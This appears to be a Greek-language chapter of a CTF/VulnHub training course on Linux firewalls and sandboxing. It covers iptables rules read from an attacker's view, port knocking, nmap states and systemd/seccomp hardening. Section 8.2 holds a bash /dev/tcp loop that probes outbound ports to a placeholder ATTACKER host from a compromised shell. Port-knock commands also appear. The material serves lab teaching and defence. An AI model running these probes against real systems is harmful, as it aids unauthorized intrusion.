# Κεφάλαιο 10 — Τείχη Προστασίας και Sandboxing

> **Διαβάστε το πριν από:** τα Μηχανήματα 5, 8 (υπηρεσίες εκτεθειμένες στο δίκτυο) και τα
> μηχανήματα της επεκταμένης τροχιάς όπου το ίδιο το δίκτυο αντιστέκεται (SickOs 1.2, Lord of the Root).
> **Γιατί υπάρχει.** Η αναγνώριση (Κεφάλαιο 01) υποθέτει ότι οι θύρες απαντούν και το reverse
> shell σας βγαίνει έξω. Δύο έλεγχοι σπάνε αυτή την υπόθεση: ένα **τείχος προστασίας** αποφασίζει
> ποια πακέτα περνούν, και ένα **sandbox** αποφασίζει τι επιτρέπεται να κάνει ένα πρόγραμμα που έχει
> παραβιαστεί. Και τα δύο εμφανίζονται στα μηχανήματα, και είναι ο πρώτος έλεγχος που επιλέγει ο
> αμυνόμενος.

**Πλήρης ανάπτυξη:** [`docs/CONCEPTS.md`](../docs/CONCEPTS.md) §2 και §15.

## 1. Τι είναι ένα τείχος προστασίας, σε μία ιδέα

Ένα τείχος προστασίας είναι **λίστα κανόνων που εφαρμόζεται σε πακέτα**, με σειρά, **πρώτο ταίριασμα
κερδίζει**. Οι κανόνες ταιριάζουν σε πρωτόκολλο, διεύθυνση πηγής/προορισμού, θύρα και **κατάσταση**
(new vs established), και μετά εκτελούν ενέργεια: **ACCEPT**, **DROP** (σιωπηλά), **REJECT** (με σφάλμα).
Τρία πράγματα κάνουν κάθε τείχος παρατηρήσιμο:

1. **Κατεύθυνση** — `INPUT` (προς αυτόν τον ξενιστή), `OUTPUT` (από αυτόν), `FORWARD` (μέσω αυτού).
2. **Προεπιλεγμένη πολιτική** — ο κανόνας όταν τίποτα δεν ταιριάξει. Ένας σωστός ξενιστής είναι `DROP` στο `INPUT`.
3. **Κατάσταση** — οι περισσότεροι επιτρέπουν `ESTABLISHED,RELATED`, γι' αυτό ένα **reverse** shell
   (εξερχόμενο) συχνά δουλεύει εκεί που ένα **bind** shell (εισερχόμενο) όχι.

> **Αυτός είναι ο λόγος σε επίπεδο πακέτου που τα reverse shells νικούν τα bind shells** — τώρα τον
> βλέπετε σε ένα ruleset αντί να τον παίρνετε ως δεδομένο.

## 2. Οι υλοποιήσεις στο Linux

| Εργαλείο | Επίπεδο | Πού θα το δείτε |
| --- | --- | --- |
| **iptables** | παλιό netfilter CLI | τα περισσότερα VulnHub |
| **nftables** (`nft`) | σύγχρονο netfilter | νεότερες διανομές |
| **ufw** | φιλικό front-end του iptables | Ubuntu |
| **firewalld** | zone-based front-end | CentOS/RHEL |

### 2.1 iptables

```bash
sudo iptables -L -n -v --line-numbers     # κανόνες με μετρητές
sudo iptables -S                          # μηχανικά αναγνώσιμη μορφή
sudo iptables-save > rules.v4             # ολόκληρο το ruleset
```

Ένα ruleset που μπλοκάρει την έξοδο εκτός από λίγες θύρες (από το `/root/newRule` του SickOs 1.2):

```text
*filter
:INPUT DROP [0:0]
:OUTPUT DROP [0:0]
-A INPUT  -p tcp -m tcp --dport 22  -j ACCEPT
-A INPUT  -p tcp -m tcp --dport 80  -j ACCEPT
-A OUTPUT -p tcp -m tcp --dport 8080 -j ACCEPT
-A OUTPUT -p tcp -m tcp --dport 443  -j ACCEPT
COMMIT
```

**Διαβάστε το ως επιτιθέμενος:** το εισερχόμενο web/SSH είναι ανοιχτό, αλλά **η έξοδος είναι DROP
εξ ορισμού** — άρα το reverse shell σας στη θύρα 4444 **δεν θα συνδεθεί ποτέ**. Οι επιτρεπόμενες
θύρες εξόδου είναι `8080` και `443`. Αυτή η μία παρατήρηση είναι γιατί το walkthrough του SickOs 1.2
προσγειώνει το shell στη **443**. Ένα βιβλίο κανόνων είναι χάρτης των μόνων θυρών που μπορείτε να
χρησιμοποιήσετε.

### 2.2 nftables, ufw, firewalld

```bash
sudo nft list ruleset
sudo ufw status verbose
sudo firewall-cmd --list-all
```

### 2.3 NAT και ανακατεύθυνση

```bash
sudo iptables -t nat -L -n -v
```

Το `nat` ξαναγράφει διευθύνσεις/θύρες — πώς ένα VM φτάνει το διαδίκτυο μέσω NAT του VirtualBox, και
πώς το port-forwarding εκθέτει μια υπηρεσία εργαστηρίου στον ξενιστή. Αν ένας στόχος είναι
προσβάσιμος σε θύρα που «δεν θα έπρεπε», ψάξτε για κανόνα NAT.

## 3. Τα τείχη ως *παζλ*: port knocking και φιλτράρισμα

Κάποια μηχανήματα κρύβουν υπηρεσίες πίσω από τείχος που ανοίγει μόνο μετά από μυστική **ακολουθία
προσπαθειών σύνδεσης** — **port knocking**. Στο **Lord of the Root 1.0.1**, η SSH μένει filtered
μέχρι το σωστό knock:

```bash
for p in 1 2 3; do nc -z TARGET $p; sleep 1; done   # ενδεικτικό knock
knock TARGET 1234 5678 9999                          # το εργαλείο knock
```

Η αμυντική ιδέα είναι πραγματική: **η «ασφάλεια μέσω συσκότισης» προσθέτει τριβή, όχι προστασία.**
Η ακολουθία knock δεν είναι μυστικό με κρυπτογραφική έννοια — καταγράψτε την κίνηση και την έχετε.

Επίσης, οι κλασικές καταστάσεις του nmap:

| Κατάσταση nmap | Σημασία σε επίπεδο πακέτου |
| --- | --- |
| `open` | SYN-ACK — κάτι ακούει |
| `closed` | RST — ξενιστής πάνω, τίποτα εκεί |
| `filtered` | τίποτα πίσω — τείχος το έριξε |
| `open\|filtered` | χωρίς απάντηση, και το nmap δεν ξέρει γιατί (συνηθισμένο στο UDP) |

## 4. Sandboxing: περιορισμός του τι μπορεί να κάνει ο κώδικας αφού τρέξει

Ένα τείχος περιορίζει την **δικτυακή** εμβέλεια. Ένα **sandbox** περιορίζει μια **διεργασία**.
Τέσσερα επίπεδα, από χονδρικό σε λεπτό:

| Επίπεδο | Μηχανισμός | Περιορίζει |
| --- | --- | --- |
| **chroot / container** | namespace + αλλαγή ρίζας | τι *βλέπει* η διεργασία από το σύστημα αρχείων |
| **systemd sandboxing** | οδηγίες unit | σύστημα αρχείων, δίκτυο, syscalls ανά υπηρεσία |
| **MAC (SELinux / AppArmor)** | πολιτική πυρήνα | ποια αρχεία/πόρους αγγίζει ένα πρόγραμμα (Κεφάλαιο 07) |
| **seccomp** | φίλτρο syscalls | ποιες **κλήσεις συστήματος** επιτρέπεται να κάνει |

### 4.1 systemd sandboxing (εργαλειοθήκη αμυνόμενου)

```ini
# /etc/systemd/system/myapp.service
[Service]
NoNewPrivileges=true
ProtectSystem=strict
ProtectHome=true
PrivateTmp=true
SystemCallFilter=@system-service
```

Κάθε γραμμή αφαιρεί επιλογές από τον επιτιθέμενο. Το `NoNewPrivileges` από μόνο του μπλοκάρει την
αναβάθμιση μέσω SUID του Κεφαλαίου 05 για αυτή την υπηρεσία.

### 4.2 seccomp

```bash
grep Seccomp /proc/self/status        # Seccomp: 0 = off, 2 = filter mode
```

Το Docker εφαρμόζει προεπιλεγμένο προφίλ seccomp που μπλοκάρει ~44 syscalls· μια διαφυγή container
συχνά αρχίζει με την εύρεση ενός syscall που το προφίλ ξέχασε (HackInOS 1, Κεφάλαιο 06).

### 4.3 AppArmor / SELinux recap

Τα συστήματα MAC του Κεφαλαίου 07 είναι το sandbox κάτω από το οποίο τρέχουν στην πραγματικότητα οι
περισσότερες υπηρεσίες σε Ubuntu/CentOS. **Μια υπηρεσία χωρίς enforced προφίλ είναι χωρίς sandbox** —
το εύρημα στα Photographer και Basic Pentesting.

> **Η σειρά του αμυνόμενου.** *Ελάχιστο προνόμιο* πρώτα (Κεφάλαια 07/08), μετά *κατάτμηση δικτύου*
> (τείχος), μετά *περιορισμός* (sandbox). Κάθε στρώμα υποθέτει ότι το προηγούμενο απέτυχε.

## 6. Ασκήσεις

1. Στο Kali, `sudo iptables -L -n -v`, μετά προσθέστε κανόνα που ρίχνει εισερχόμενο `INPUT` από μία
   IP και επιβεβαιώστε με `nmap` ότι η θύρα είναι τώρα `filtered`.
2. Γράψτε (χωρίς να τρέξετε) ruleset που επιτρέπει web+SSH και **μόνο** έξοδο 443· εξηγήστε ποιες
   θύρες reverse shell θα αποτύχουν.
3. Συγκρίνετε `nmap` σε θύρα `DROP` vs `REJECT` και εξηγήστε τη διαφορά στην αναφερόμενη κατάσταση.
4. Θέστε `NoNewPrivileges=true` σε δοκιμαστική υπηρεσία και αποδείξτε ότι ένα SUID binary δεν
   αναβαθμίζει πλέον.
5. Τρέξτε `grep Seccomp /proc/self/status` μέσα και έξω από container Docker.

## 8. Σημειωμένες εντολές — κάθε είσοδος, κάθε έξοδος

### 8.1 Ανάγνωση ruleset

```bash
sudo iptables -S
```

```text
-P INPUT DROP
-A INPUT -p tcp --dport 22 -j ACCEPT
-A OUTPUT -p tcp --dport 443 -j ACCEPT
```

`-P` = η **πολιτική** της αλυσίδας (προεπιλεγμένη ενέργεια). Κάθε `-A` προσθέτει κανόνα· το πρώτο
ταίριασμα κερδίζει, άρα η σειρά μετράει.

### 8.2 Ανακάλυψη περιορισμών εξόδου από κέλυφος

```bash
ss -tnp
for p in 22 80 443 4444; do timeout 2 bash -c "echo > /dev/tcp/ATTACKER/$p" && echo "$p open" || echo "$p blocked"; done
```

Αυτή είναι η εμπειρική εκδοχή της ανάγνωσης του ruleset: δοκιμάστε κάθε θύρα εξόδου και δείτε ποια
φτάνει σε listener στο Kali.

### 8.3 Port knocking

```bash
knock TARGET 1234 5678 9999
nmap -p 22 TARGET          # τώρα ανοιχτή
```

### 8.4 systemd και seccomp

```bash
systemctl show myapp -p NoNewPrivileges -p ProtectSystem
grep Seccomp /proc/self/status
```

### 8.5 Καταστάσεις nmap

```bash
sudo nmap -Pn -p 22,80,4444 TARGET
```

Διαβάστε κάθε γραμμή: `open`, `closed`, `filtered` ή `open|filtered` — η απάντηση σε επίπεδο πακέτου,
όχι μαντεψιά.
